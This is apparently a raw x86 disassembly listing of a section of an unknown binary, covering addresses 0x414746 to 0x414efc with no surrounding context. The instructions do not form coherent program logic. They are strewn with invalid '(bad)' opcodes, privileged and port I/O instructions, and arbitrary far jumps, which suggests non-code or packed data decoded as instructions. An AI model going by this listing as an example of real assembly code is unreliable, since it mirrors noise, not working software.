  414746:	mov    al,ds:0xedd2c2e1
  41474b:	fwait
  41474c:	xchg   bh,cl
  41474e:	xor    ebp,DWORD PTR [ecx-0x51]
  414751:	iret   
  414752:	mov    eax,ds:0x2f83f26d
  414757:	jmp    0xc49b:0x21a8debc
  41475e:	push   ds
  41475f:	fsubr  QWORD PTR [esi]
  414761:	mov    ds:0xf83fe5fc,al
  414766:	pop    edi
  414767:	pop    ebp
  414768:	add    ecx,0x2c8f30d
  41476e:	xor    esi,DWORD PTR ss:[edi]
  414771:	lock mov dh,0xa3
  414774:	stos   DWORD PTR es:[edi],eax
  414775:	xlat   BYTE PTR ds:[ebx]
  414776:	adc    DWORD PTR [edx-0x52c8df8c],ebx
  41477c:	stos   BYTE PTR es:[edi],al
  41477d:	xchg   ebx,eax
  41477e:	leave  
  41477f:	fidiv  WORD PTR [edi-0x3f]
  414782:	or     al,0x45
  414784:	push   esp
  414785:	and    al,0x26
  414787:	test   DWORD PTR cs:[edx+0x4],ebx
  41478b:	ret    0xa177
  41478e:	pop    ss
  41478f:	sub    dl,BYTE PTR [ecx-0xa]
  414792:	add    BYTE PTR [edx-0x55168e7c],ah
  414798:	fst    DWORD PTR [edi-0x769a56d]
  41479e:	fadd   DWORD PTR [esp+edi*2-0x344cc65b]
  4147a5:	add    ch,BYTE PTR [eax]
  4147a7:	add    BYTE PTR [edi-0x24b0440f],bh
  4147ad:	lea    eax,[edx]
  4147af:	jns    0x414825
  4147b1:	fsub   QWORD PTR [eax+0x29]
  4147b4:	push   ebp
  4147b5:	lods   eax,DWORD PTR ds:[esi]
  4147b6:	stos   DWORD PTR es:[edi],eax
  4147b7:	sbb    dh,BYTE PTR [ebp+0x244b9d24]
  4147bd:	jb     0x4147b7
  4147bf:	dec    eax
  4147c0:	stos   DWORD PTR es:[edi],eax
  4147c1:	dec    edi
  4147c2:	mov    eax,0x9b9f6a53
  4147c7:	dec    eax
  4147c8:	xchg   ebx,eax
  4147c9:	xchg   ebp,eax
  4147ca:	push   eax
  4147cb:	sub    al,0xc6
  4147cd:	lds    esp,FWORD PTR [ebx+0x1ab38c0]
  4147d3:	imul   edi,DWORD PTR [ebx+eax*4-0x18],0x6d
  4147d8:	loopne 0x4147a2
  4147da:	jp     0x4147e8
  4147dc:	adc    DWORD PTR [ebx],ebp
  4147de:	ficomp WORD PTR [ecx]
  4147e0:	xchg   esp,eax
  4147e1:	mov    cl,cl
  4147e3:	scas   al,BYTE PTR es:[edi]
  4147e4:	iret   
  4147e5:	push   0x73c5ab1f
  4147ea:	jb     0x41482e
  4147ec:	enter  0xa7e6,0x9
  4147f0:	das    
  4147f1:	ds pop ss
  4147f3:	div    DWORD PTR [ebx+0x7883ff86]
  4147f9:	test   BYTE PTR [esi-0x46],0xfe
  4147fd:	jge    0x4147cc
  4147ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414800:	xor    DWORD PTR [esi+0x4ef8fe86],ebx
  414806:	sti    
  414807:	adc    BYTE PTR [edx],cl
  414809:	fiadd  DWORD PTR [edi-0x2]
  41480c:	pop    ebp
  41480d:	pop    ebx
  41480e:	inc    eax
  41480f:	ss adc eax,0x44fef627
  414815:	add    eax,0xcf0d7394
  41481a:	(bad)  
  41481b:	fisttp WORD PTR [esi+0x24132e75]
  414821:	dec    eax
  414822:	jmp    0xb2ff:0xa04ae40
  414829:	nop
  41482a:	mov    esi,0x5aff916b
  41482f:	loop   0x414813
  414831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414832:	cmp    BYTE PTR [ecx],ch
  414834:	call   0x6910:0x97cc4fef
  41483b:	push   ebx
  41483c:	mov    esi,0x24ae0cfa
  414841:	mov    ebp,0x2a72a1fe
  414846:	out    dx,al
  414847:	pop    edi
  414848:	lahf   
  414849:	dec    edx
  41484a:	push   esp
  41484b:	inc    dh
  41484d:	and    eax,0x659c4ae4
  414852:	sbb    BYTE PTR [ebx+0xb50ed21],ah
  414858:	fcom   DWORD PTR [ebp-0x60f7e331]
  41485e:	jecxz  0x414886
  414860:	add    esp,0x4e
  414863:	add    BYTE PTR [esi],0xe
  414866:	dec    edi
  414867:	cmp    ebx,DWORD PTR [ebp-0x4d]
  41486a:	sbb    esp,ebp
  41486c:	dec    eax
  41486d:	idiv   BYTE PTR [edi+0x60]
  414870:	push   ebp
  414871:	mov    ch,0x6b
  414873:	mov    dh,0x37
  414875:	jnp    0x414899
  414877:	or     BYTE PTR [esp+eax*8+0x7d],0xf0
  41487c:	cld    
  41487d:	in     al,dx
  41487e:	int    0xf
  414880:	mov    esi,0x1176f95c
  414885:	pop    esi
  414886:	xchg   edi,eax
  414887:	add    eax,0xda75ff7e
  41488c:	pop    ss
  41488d:	push   cs
  41488e:	sbb    eax,0xaa214960
  414893:	or     DWORD PTR [eax+0xb],0xf0f1e5de
  41489a:	push   ds
  41489b:	scas   eax,DWORD PTR es:[edi]
  41489c:	test   eax,0x6ce63ba
  4148a1:	fadd   st,st(4)
  4148a3:	sti    
  4148a4:	call   0x3c3f5386
  4148a9:	mov    al,ds:0x2c9f739
  4148ae:	jge    0x4148eb
  4148b0:	jno    0x414895
  4148b2:	rcr    BYTE PTR [esi+0x5011d03e],1
  4148b8:	mov    BYTE PTR [edx+eax*2-0x80],cl
  4148bc:	jl     0x4148a5
  4148be:	mov    eax,0x7e866dfb
  4148c3:	cmp    BYTE PTR [ebx+0x2b],0xa9
  4148c7:	mov    ds:0x337bb49f,eax
  4148cc:	ja     0x4148ca
  4148ce:	mov    bh,dh
  4148d0:	call   0x3ebc:0x782e4432
  4148d7:	xchg   esi,eax
  4148d8:	cwde   
  4148d9:	nop
  4148da:	mov    dh,0xa6
  4148dc:	xor    BYTE PTR [edi],dh
  4148de:	fmul   st,st(7)
  4148e0:	retf   0x92d9
  4148e3:	hlt    
  4148e4:	xor    DWORD PTR [edi+0x7a],ebp
  4148e7:	pop    ecx
  4148e8:	add    DWORD PTR [ebp+0x69],ebp
  4148eb:	push   edx
  4148ec:	mov    ds:0xca14ad3d,eax
  4148f1:	jl     0x414964
  4148f3:	sub    eax,0x1bb1b386
  4148f8:	pop    eax
  4148f9:	cld    
  4148fa:	dec    esi
  4148fb:	dec    esp
  4148fc:	mov    dh,0xac
  4148fe:	mov    ecx,0xeda56de1
  414903:	les    edx,FWORD PTR [esi+0x1e]
  414906:	push   ds
  414907:	clc    
  414908:	pushf  
  414909:	jne    0x41492e
  41490b:	out    0x92,al
  41490d:	push   0xf55db905
  414912:	lds    ebp,FWORD PTR [edi-0x206e462e]
  414918:	es (bad) 
  41491a:	mov    esi,0x1e78b222
  41491f:	inc    ecx
  414920:	rcl    BYTE PTR [esi-0x14],1
  414923:	enter  0x6b7f,0x79
  414927:	jb     0x414950
  414929:	in     al,0x11
  41492b:	add    al,0xa5
  41492d:	sbb    BYTE PTR [ecx+0x44],dh
  414930:	fcmove st,st(7)
  414932:	push   es
  414933:	aaa    
  414934:	xchg   edi,eax
  414935:	shl    BYTE PTR [ecx-0x39],0x80
  414939:	in     eax,dx
  41493a:	push   ebx
  41493b:	sub    al,0x9b
  41493d:	mov    ah,0x15
  41493f:	adc    ecx,DWORD PTR [ebx+0x45]
  414942:	mov    ds:0x56db6238,al
  414947:	out    dx,al
  414948:	mov    al,0xb4
  41494a:	mov    edx,0xaac9cb8c
  41494f:	jnp    0x414989
  414951:	pop    ecx
  414952:	ret    
  414953:	popf   
  414954:	dec    edi
  414955:	aad    0x3d
  414957:	inc    ecx
  414958:	mov    edi,0xa1ed74f7
  41495d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41495f:	xchg   esi,eax
  414960:	cmp    DWORD PTR [edi],0x9881a0b7
  414966:	mov    al,ds:0x2d312883
  41496b:	sbb    cl,BYTE PTR [edx]
  41496d:	mov    ecx,ebx
  41496f:	inc    ebx
  414970:	rol    ebx,0xec
  414973:	popf   
  414974:	jne    0x414939
  414976:	inc    edx
  414977:	das    
  414978:	xor    edx,DWORD PTR [esi]
  41497a:	bound  ebp,QWORD PTR [esi+0x70]
  41497d:	jne    0x414911
  41497f:	push   cs
  414980:	sub    eax,0x80d9e13e
  414985:	neg    DWORD PTR [edi]
  414987:	stc    
  414988:	nop
  414989:	or     eax,0x1045f2d3
  41498e:	xchg   ebx,eax
  41498f:	repnz ficomp DWORD PTR [eax+0xf]
  414993:	lods   al,BYTE PTR ds:[esi]
  414994:	push   ebp
  414995:	aas    
  414996:	outs   dx,DWORD PTR ds:[esi]
  414997:	je     0x4149c8
  414999:	pop    edx
  41499a:	push   ebp
  41499b:	test   BYTE PTR [edx-0x60],bh
  41499e:	jg     0x41496c
  4149a0:	inc    esp
  4149a1:	push   ebx
  4149a2:	push   ebx
  4149a3:	test   al,0xb0
  4149a5:	add    esi,DWORD PTR ss:[ebp+0x16]
  4149a9:	mov    ds:0xeb573727,eax
  4149ae:	inc    ebp
  4149af:	sar    ebx,cl
  4149b1:	cmp    al,0x8d
  4149b3:	cmp    DWORD PTR [edi-0x14],ebx
  4149b6:	inc    esp
  4149b7:	jmp    0xfd18:0xee416674
  4149be:	sub    BYTE PTR [ebx-0x69dce715],0xb3
  4149c5:	mov    dh,0x8b
  4149c7:	mov    ecx,cr5
  4149ca:	xor    eax,0x36ce2a60
  4149cf:	outs   dx,DWORD PTR ds:[esi]
  4149d0:	pop    ebp
  4149d1:	mov    bh,0x3f
  4149d3:	adc    BYTE PTR [ebp-0xc],0x85
  4149d7:	std    
  4149d8:	sbb    edx,DWORD PTR [ecx-0x3362ec2d]
  4149de:	fidiv  DWORD PTR [esi-0x1d]
  4149e1:	push   0x1a
  4149e3:	nop
  4149e4:	ror    DWORD PTR [esp+edx*4],1
  4149e7:	push   edi
  4149e8:	inc    ebp
  4149e9:	xor    bh,BYTE PTR [edx-0x73df2e91]
  4149ef:	inc    ecx
  4149f0:	inc    ebx
  4149f1:	rcr    DWORD PTR [ecx],cl
  4149f3:	aaa    
  4149f4:	xor    BYTE PTR [eax],dl
  4149f6:	(bad)  
  4149f8:	mov    dl,0xf8
  4149fa:	popf   
  4149fb:	adc    DWORD PTR [eax],esp
  4149fd:	jecxz  0x4149df
  4149ff:	xor    bl,BYTE PTR [edi+0x77]
  414a02:	push   ebp
  414a03:	in     eax,dx
  414a04:	loop   0x414a5f
  414a06:	xchg   al,al
  414a08:	loope  0x414a31
  414a0a:	inc    ebp
  414a0b:	fadd   st,st(7)
  414a0d:	aaa    
  414a0e:	mov    edx,0x4c9dc06e
  414a13:	ret    0xbc6a
  414a16:	(bad)  
  414a17:	and    ch,BYTE PTR [esp+eiz*2]
  414a1a:	jg     0x414a76
  414a1c:	mov    ebx,fs
  414a1e:	mov    ds:0x7a39c645,al
  414a23:	add    esi,ebx
  414a25:	mov    gs,WORD PTR [eax]
  414a27:	gs cwde 
  414a29:	mov    ebp,DWORD PTR [esi-0x27]
  414a2c:	ja     0x414a2e
  414a2e:	stc    
  414a2f:	ffree  st(7)
  414a31:	or     al,0xd3
  414a34:	jl     0x4149db
  414a36:	retf   
  414a37:	in     eax,0x73
  414a39:	or     eax,DWORD PTR [esi-0x2e]
  414a3c:	cmp    BYTE PTR [esi+0x1a],ch
  414a3f:	fcom   QWORD PTR [eax-0x4a]
  414a42:	jmp    0x4149e5
  414a44:	push   ds
  414a45:	(bad)  
  414a46:	cli    
  414a47:	fmul   st(3),st
  414a49:	out    0x3f,eax
  414a4b:	cs sbb al,0x35
  414a4e:	sbb    BYTE PTR [esi+ecx*8+0x51],ch
  414a52:	ins    DWORD PTR es:[edi],dx
  414a53:	jnp    0x414a5d
  414a55:	ror    BYTE PTR [eax-0x2fc10011],1
  414a5b:	mov    eax,ds:0x4834cf72
  414a60:	mov    es,WORD PTR [edx+0x20f7883a]
  414a66:	push   ecx
  414a67:	mov    esp,eax
  414a69:	arpl   WORD PTR [eax],bp
  414a6b:	mov    dl,0x5e
  414a6d:	scas   al,BYTE PTR es:[edi]
  414a6e:	pop    eax
  414a6f:	jmp    0x414acf
  414a71:	(bad)  
  414a72:	xchg   ecx,eax
  414a73:	jl     0x414a97
  414a75:	sub    eax,0x52d0586e
  414a7a:	call   DWORD PTR [ebx-0x55]
  414a7d:	mov    WORD PTR [ebx-0x32],fs
  414a80:	inc    edx
  414a81:	push   0xffffff8f
  414a83:	call   0x6ea3b6f
  414a88:	xlat   BYTE PTR ds:[ebx]
  414a89:	in     eax,dx
  414a8a:	fdivr  QWORD PTR [edi]
  414a8c:	out    0x9f,eax
  414a8e:	or     ebx,ebx
  414a90:	jle    0x414a8b
  414a92:	inc    ecx
  414a93:	cmp    ebp,DWORD PTR [ebp+0x34]
  414a96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a97:	cli    
  414a98:	adc    DWORD PTR [edi+0x476a9373],esi
  414a9e:	pop    ebp
  414a9f:	adc    eax,0x57a0069c
  414aa4:	inc    esp
  414aa5:	int3   
  414aa6:	in     al,dx
  414aa7:	into   
  414aa8:	jecxz  0x414acb
  414aaa:	das    
  414aab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aac:	fwait
  414aad:	mov    ch,0x62
  414aaf:	dec    eax
  414ab0:	int3   
  414ab1:	lods   eax,DWORD PTR ds:[esi]
  414ab2:	mov    ds:0x50350241,eax
  414ab7:	xchg   edi,eax
  414ab8:	adc    BYTE PTR [esi],ah
  414aba:	xchg   ecx,eax
  414abb:	ss in  al,0xce
  414abe:	cdq    
  414abf:	ret    
  414ac0:	addr16 mov ebx,0xd84ad41b
  414ac6:	sub    bl,0x9a
  414ac9:	fstp   TBYTE PTR [edx]
  414acb:	lods   eax,DWORD PTR ds:[esi]
  414acc:	das    
  414acd:	stc    
  414ace:	push   ds
  414acf:	sub    al,0x47
  414ad1:	ins    BYTE PTR es:[edi],dx
  414ad2:	leave  
  414ad3:	jnp    0x414a5c
  414ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ad6:	inc    edi
  414ad7:	test   BYTE PTR [edx-0x64],0xca
  414adb:	outs   dx,DWORD PTR ds:[esi]
  414adc:	push   ecx
  414add:	fld    QWORD PTR [edx+0x2037d060]
  414ae3:	inc    esp
  414ae4:	xlat   BYTE PTR ds:[ebx]
  414ae5:	sti    
  414ae6:	or     eax,0xa890138
  414aeb:	(bad)  
  414aed:	in     eax,0x46
  414aef:	sub    DWORD PTR [esi+0x13],0x3f
  414af3:	cmp    dh,BYTE PTR [eax+0x11e63b06]
  414af9:	sbb    esp,eax
  414afb:	out    dx,eax
  414afc:	pop    edi
  414afd:	add    bh,dh
  414aff:	shr    DWORD PTR ds:0x496b7977,cl
  414b05:	xchg   edx,eax
  414b06:	call   0x798b:0x22654c1d
  414b0d:	pop    esi
  414b0e:	repz mov edi,0x2e3d411a
  414b14:	fnsave [eax-0x66]
  414b17:	sbb    BYTE PTR [esi+0x3d],ah
  414b1a:	out    0x36,al
  414b1c:	and    DWORD PTR [esi],0x92302eca
  414b22:	xlat   BYTE PTR ds:[ebx]
  414b23:	out    0xa0,eax
  414b25:	fdiv   QWORD PTR [ecx+0x2d]
  414b28:	aam    0x2f
  414b2a:	jmp    0x414af7
  414b2c:	fidivr WORD PTR [ebp-0xfe35816]
  414b32:	push   ebp
  414b33:	cmp    al,0xdd
  414b35:	iret   
  414b36:	or     eax,0xd40746eb
  414b3b:	and    BYTE PTR ds:0xaea19f82,dh
  414b41:	clc    
  414b42:	push   ds
  414b43:	cmp    DWORD PTR [edi],edx
  414b45:	pop    ebp
  414b46:	jmp    0x414b9a
  414b48:	xchg   ebp,eax
  414b49:	jmp    0x264e:0x2b20066f
  414b50:	xor    eax,0x35c95b09
  414b55:	sbb    BYTE PTR [edx+ebp*4-0x283dce59],bl
  414b5c:	sbb    eax,0xfb73a15
  414b61:	mov    dl,0x52
  414b63:	(bad)  
  414b64:	mov    BYTE PTR [eax],dl
  414b66:	add    al,0xe2
  414b68:	adc    DWORD PTR [esi+ecx*1-0x72],ebp
  414b6c:	rol    DWORD PTR [esi+0x42],0xe8
  414b70:	push   es
  414b71:	pop    edx
  414b72:	test   BYTE PTR [esi+0x14e6ca78],0xfc
  414b79:	and    BYTE PTR [edx-0x62],ah
  414b7c:	push   esi
  414b7d:	sahf   
  414b7e:	gs jbe 0x414b36
  414b81:	push   ds
  414b82:	sub    BYTE PTR [ecx+0x15],ah
  414b85:	pop    ebx
  414b86:	test   eax,0x8b0b3cc7
  414b8b:	cmp    eax,ecx
  414b8d:	aad    0xc
  414b8f:	xor    eax,0x341c26af
  414b94:	adc    eax,0xcaf1699c
  414b99:	push   esi
  414b9a:	jecxz  0x414bed
  414b9c:	repnz or eax,DWORD PTR [eax-0x3d6e8134]
  414ba3:	mov    dl,0x58
  414ba5:	idiv   DWORD PTR [ecx]
  414ba7:	sub    BYTE PTR [ecx+0x67],cl
  414baa:	fstp   st(7)
  414bac:	xor    DWORD PTR [ecx+ebx*2+0x3c],esi
  414bb0:	mov    eax,ds:0x51b6406e
  414bb5:	push   edx
  414bb6:	lsl    ebx,WORD PTR [ebp+0x55]
  414bba:	(bad)  
  414bbb:	dec    eax
  414bbc:	xchg   esi,eax
  414bbd:	ds sbb eax,0xf8086a13
  414bc3:	mov    ds:0xbbe2efac,eax
  414bc8:	inc    bp
  414bca:	inc    edx
  414bcb:	cmp    dh,bh
  414bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bce:	stos   DWORD PTR es:[edi],eax
  414bcf:	stos   DWORD PTR es:[edi],eax
  414bd0:	and    al,0x97
  414bd2:	pop    ebp
  414bd3:	out    0xe6,al
  414bd5:	arpl   WORD PTR [eax],cx
  414bd7:	loope  0x414c09
  414bd9:	cmp    ebx,edi
  414bdb:	or     eax,0x3aac0368
  414be0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414be1:	lock idiv BYTE PTR [edi+0x44ed184f]
  414be8:	call   0x4bd7:0x63edfd24
  414bef:	fucomp st(7)
  414bf1:	lahf   
  414bf2:	shl    BYTE PTR [esi+0x5f],1
  414bf5:	sub    BYTE PTR ds:0x1fad2700,0x20
  414bfc:	shl    BYTE PTR [ecx+0x5b98ac73],1
  414c02:	push   edx
  414c03:	gs cli 
  414c05:	mov    esi,0x60b018ee
  414c0a:	into   
  414c0b:	repz hlt 
  414c0d:	push   ebx
  414c0e:	sti    
  414c0f:	jae    0x414be3
  414c11:	xchg   edi,eax
  414c12:	push   cs
  414c13:	push   edi
  414c14:	adc    eax,DWORD PTR [ebx]
  414c16:	sub    BYTE PTR [ecx-0x15],bl
  414c19:	neg    BYTE PTR [ebp+0x12a1863c]
  414c1f:	pushf  
  414c20:	jge    0x414ba5
  414c22:	out    dx,eax
  414c23:	cmp    eax,ebp
  414c25:	inc    ebx
  414c26:	mov    ebx,0x18a34aa0
  414c2b:	pop    ebp
  414c2c:	dec    esp
  414c2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c2e:	out    0x8f,eax
  414c30:	ret    
  414c31:	bound  ebx,QWORD PTR [edx]
  414c33:	and    eax,0x7457b410
  414c38:	add    DWORD PTR [eax-0x6903d2ce],ecx
  414c3e:	push   ecx
  414c3f:	xchg   edi,eax
  414c40:	fwait
  414c41:	(bad)  
  414c42:	cli    
  414c43:	dec    edi
  414c44:	test   al,0x96
  414c46:	push   ecx
  414c47:	mov    dh,0x8b
  414c49:	inc    ecx
  414c4a:	popf   
  414c4b:	retf   
  414c4c:	inc    eax
  414c4d:	fs aam 0xd9
  414c50:	ret    
  414c51:	add    esi,edx
  414c53:	fld    TBYTE PTR [esi+edx*8-0x44]
  414c57:	jmp    0x54455626
  414c5c:	shl    BYTE PTR [esi],1
  414c5e:	jae    0x414c93
  414c60:	cmp    al,0xb
  414c62:	cs pushf 
  414c64:	xor    edx,DWORD PTR [eax]
  414c66:	ret    
  414c67:	or     DWORD PTR [ebx],eax
  414c69:	push   ecx
  414c6a:	loope  0x414c51
  414c6c:	mov    bh,0xa5
  414c6e:	pop    ecx
  414c6f:	les    ecx,FWORD PTR [esi+0x76]
  414c72:	out    0x59,al
  414c74:	cli    
  414c75:	loopne 0x414c76
  414c77:	jb     0x414c6a
  414c79:	and    al,0x17
  414c7b:	mov    ds:0x8426d03,eax
  414c80:	cdq    
  414c81:	sub    BYTE PTR [edi+0x79],dh
  414c84:	or     esi,ecx
  414c86:	add    ch,BYTE PTR [edi+0x35]
  414c89:	inc    edi
  414c8a:	daa    
  414c8b:	add    al,0x8
  414c8d:	int3   
  414c8e:	cdq    
  414c8f:	xchg   ebp,eax
  414c90:	xchg   ebx,eax
  414c91:	push   cs
  414c92:	rol    BYTE PTR [ecx],1
  414c94:	stc    
  414c95:	jae    0x414c25
  414c97:	and    ebx,DWORD PTR [eax-0x33]
  414c9a:	ret    
  414c9b:	lods   al,BYTE PTR ds:[esi]
  414c9c:	sub    ch,dl
  414c9e:	int3   
  414c9f:	sbb    BYTE PTR fs:[edx],dh
  414ca2:	call   0x6b205de1
  414ca7:	(bad)  
  414ca8:	mov    eax,ds:0x8825244b
  414cad:	pop    es
  414cae:	jmp    0x663b:0xc5bf20a0
  414cb5:	out    0x76,al
  414cb7:	js     0x414ca2
  414cb9:	and    al,0x26
  414cbb:	loop   0x414c5b
  414cbd:	or     DWORD PTR [ebx-0x62ab4818],ebp
  414cc3:	pop    ds
  414cc4:	jmp    0x414d13
  414cc6:	mov    bl,0x3c
  414cc8:	xor    eax,0xde4c35e6
  414ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cce:	lock dec edx
  414cd0:	pop    es
  414cd1:	lods   eax,DWORD PTR ds:[esi]
  414cd2:	jae    0x414cca
  414cd4:	add    ecx,DWORD PTR [edx]
  414cd6:	(bad)  
  414cd7:	icebp  
  414cd8:	xchg   ebp,eax
  414cd9:	adc    DWORD PTR [edi-0x1b],edi
  414cdc:	repz add BYTE PTR [esi],bh
  414cdf:	addr16 cli 
  414ce1:	pop    ebp
  414ce2:	pop    ecx
  414ce3:	mov    ebx,0x8a558c2d
  414ce8:	jne    0x414c7e
  414cea:	retf   0xf5e0
  414ced:	popf   
  414cee:	jmp    0x34d3:0x62887dc2
  414cf5:	jmp    0xe63c20eb
  414cfa:	inc    eax
  414cfb:	adc    bh,dh
  414cfd:	mov    dl,0x15
  414cff:	cdq    
  414d00:	mov    BYTE PTR ds:0x73aad64c,bh
  414d06:	loopne 0x414c88
  414d08:	xor    dh,BYTE PTR [edi]
  414d0a:	pop    ebp
  414d0b:	bound  ebp,QWORD PTR [edx+esi*8]
  414d0e:	pop    ecx
  414d0f:	imul   esp,DWORD PTR [edi+0x5f],0xef4dcdc5
  414d16:	stc    
  414d17:	adc    eax,0x932b8df7
  414d1c:	(bad)  
  414d1d:	iret   
  414d1e:	push   ebx
  414d1f:	mul    BYTE PTR [ecx-0xb]
  414d22:	mov    eax,ds:0x1b3a0cc1
  414d27:	cmc    
  414d28:	imul   ebx,DWORD PTR ds:0x8602825a,0xa0e27da4
  414d32:	dec    esp
  414d33:	inc    DWORD PTR [edi+0x7b]
  414d36:	lea    edx,[ebp-0x4c]
  414d39:	cmp    eax,0x70e7e9bb
  414d3e:	jle    0x414d7f
  414d40:	pop    ebx
  414d41:	(bad)  
  414d42:	enter  0xa199,0x6
  414d46:	xchg   edx,eax
  414d47:	pop    edx
  414d48:	in     al,dx
  414d49:	mov    edi,0xd8346790
  414d4e:	pop    ds
  414d4f:	jle    0x414daa
  414d51:	cmp    cl,dh
  414d53:	inc    ebp
  414d54:	popf   
  414d55:	call   0x948:0xa49a8c16
  414d5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d5d:	in     eax,dx
  414d5e:	in     eax,0x35
  414d60:	cmc    
  414d61:	sbb    DWORD PTR [edx+0x52],ecx
  414d64:	mov    al,ds:0x8641ed2b
  414d69:	add    ebp,edi
  414d6b:	mov    esi,0x79ec58d4
  414d70:	pop    ds
  414d71:	repz jp 0x414cfc
  414d74:	lock push ss
  414d76:	xchg   edi,eax
  414d77:	imul   ecx,eax,0x82f9d08d
  414d7d:	pop    edx
  414d7e:	call   0x5092:0x9f1f4fbf
  414d85:	addr16 jne 0x414d8d
  414d88:	mov    edx,DWORD PTR [eax+0x75]
  414d8b:	cli    
  414d8c:	aaa    
  414d8d:	jo     0x414e01
  414d8f:	out    0x8a,eax
  414d91:	jl     0x414e0d
  414d93:	mov    esp,0x5bd14614
  414d98:	push   esp
  414d99:	in     eax,dx
  414d9a:	shl    cl,1
  414d9c:	xor    esi,DWORD PTR [esi]
  414d9e:	pop    ds
  414d9f:	hlt    
  414da0:	mov    ebp,DWORD PTR [ecx-0x2c0d2611]
  414da6:	dec    edi
  414da7:	cs sub al,0xc0
  414daa:	cwde   
  414dab:	sub    eax,0x18b8222b
  414db0:	mov    edx,DWORD PTR gs:[eax+0x74619d5e]
  414db7:	sbb    al,0x8e
  414db9:	xor    al,0xd3
  414dbb:	xor    bh,0x2
  414dbe:	cmp    bl,BYTE PTR [edi+0x1ce0c1ed]
  414dc4:	sub    BYTE PTR [ecx-0x2e],0x8a
  414dc8:	adc    al,dl
  414dca:	xchg   ecx,eax
  414dcb:	cmp    DWORD PTR [edx-0x3d2e7e1b],esi
  414dd1:	scas   al,BYTE PTR es:[edi]
  414dd2:	jg     0x414d66
  414dd4:	xchg   al,dl
  414dd6:	pushf  
  414dd7:	pushf  
  414dd8:	mov    ds:0x4a218fef,al
  414ddd:	mov    cl,0xf1
  414ddf:	ret    
  414de0:	scas   eax,DWORD PTR es:[edi]
  414de1:	inc    edx
  414de2:	mov    esp,0x5637f6a1
  414de7:	inc    ebx
  414de8:	sar    dh,1
  414dea:	clc    
  414deb:	cli    
  414dec:	add    bh,cl
  414dee:	pusha  
  414def:	es adc esi,DWORD PTR fs:[ebx-0x2764cb3f]
  414df7:	int3   
  414df8:	jecxz  0x414daf
  414dfa:	fwait
  414dfb:	push   0xffffffbf
  414dfd:	inc    edi
  414dfe:	add    BYTE PTR [edi-0x4a],0x18
  414e02:	jo     0x414e69
  414e04:	and    al,0xa
  414e06:	rcr    bl,0x7e
  414e09:	cmp    esi,DWORD PTR [ecx-0x5a]
  414e0c:	ret    
  414e0d:	aad    0x9d
  414e0f:	cs mov dh,0x53
  414e12:	mov    esp,0x74a53590
  414e17:	dec    edi
  414e18:	dec    ebx
  414e19:	(bad)  
  414e1a:	idiv   DWORD PTR [ebp-0x32ace265]
  414e20:	push   ebx
  414e21:	pusha  
  414e22:	inc    edi
  414e23:	dec    ebx
  414e24:	add    BYTE PTR [edi+edi*2],0xb7
  414e28:	das    
  414e29:	stc    
  414e2a:	jns    0x414dc3
  414e2c:	int    0x38
  414e2e:	in     eax,dx
  414e2f:	push   es
  414e30:	scas   eax,DWORD PTR es:[edi]
  414e31:	frstor [esi+0x66]
  414e34:	mov    ds:0x500d44fb,eax
  414e39:	xor    DWORD PTR [ecx],0x94d54899
  414e3f:	xor    DWORD PTR [edx+ecx*4-0x50e0b9ea],edx
  414e46:	xchg   ecx,eax
  414e47:	jae    0x414ec7
  414e49:	jne    0x414e6b
  414e4b:	jnp    0x414e0a
  414e4d:	popa   
  414e4e:	or     BYTE PTR [ebx-0x17],bl
  414e51:	imul   eax,DWORD PTR [edx],0xffffffc4
  414e54:	test   eax,0xd6cfc608
  414e59:	mov    DWORD PTR [ebx+0x75d57095],eax
  414e5f:	inc    edx
  414e60:	pop    ss
  414e61:	nop
  414e62:	(bad)  
  414e63:	add    eax,0x378c3004
  414e68:	sub    al,0x5d
  414e6a:	es in  eax,dx
  414e6c:	cli    
  414e6d:	push   0x70c124a2
  414e72:	lods   al,BYTE PTR ds:[esi]
  414e73:	int    0x37
  414e75:	mov    dl,0x58
  414e77:	sti    
  414e78:	or     al,0x8
  414e7a:	jb     0x414e2f
  414e7c:	mov    bl,0x3c
  414e7e:	add    bl,BYTE PTR [edx-0x348fd246]
  414e84:	xor    eax,0x914f13b0
  414e8a:	jle    0x414ec5
  414e8c:	jecxz  0x414e2f
  414e8e:	neg    BYTE PTR [eax]
  414e90:	call   0x8870:0x8193744
  414e97:	adc    dl,bh
  414e99:	out    dx,eax
  414e9a:	(bad)  [edx-0x327e959e]
  414ea0:	rol    DWORD PTR [ebx+0x1c],1
  414ea3:	push   0xfffffffc
  414ea5:	xchg   edi,eax
  414ea6:	aas    
  414ea7:	push   0xffffff88
  414ea9:	je     0x414e42
  414eab:	dec    ecx
  414eac:	and    BYTE PTR [ebp+0x43],cl
  414eaf:	lahf   
  414eb0:	imul   edx,DWORD PTR [ecx-0x523d09f3],0xffffffe2
  414eb7:	mov    DWORD PTR ds:0xd0609ac4,edi
  414ebd:	(bad)  
  414ebe:	push   cs
  414ebf:	shl    BYTE PTR [eax-0x44601ac7],1
  414ec5:	xchg   ebp,eax
  414ec6:	dec    esp
  414ec7:	popf   
  414ec8:	pop    edi
  414ec9:	loop   0x414f12
  414ecb:	dec    ebp
  414ecc:	push   edi
  414ecd:	dec    esp
  414ece:	sub    BYTE PTR [ebx-0x37],dl
  414ed1:	jbe    0x414f40
  414ed3:	inc    edx
  414ed4:	or     BYTE PTR gs:[esi],0x49
  414ed8:	nop
  414ed9:	shl    DWORD PTR [ecx+0x78],1
  414edc:	sub    ah,0x47
  414edf:	das    
  414ee0:	pop    ds
  414ee1:	mov    bh,0x4f
  414ee3:	push   es
  414ee4:	fs push eax
  414ee6:	or     al,0xbf
  414ee8:	ror    DWORD PTR [ebx-0x27],cl
  414eeb:	in     al,0x7
  414eed:	mov    ebp,0xa905987
  414ef2:	mov    ebx,0x360ba687
  414ef7:	loop   0x414f47
  414ef9:	cwde   
  414efa:	je     0x414e91
  414efc:	out    dx,eax
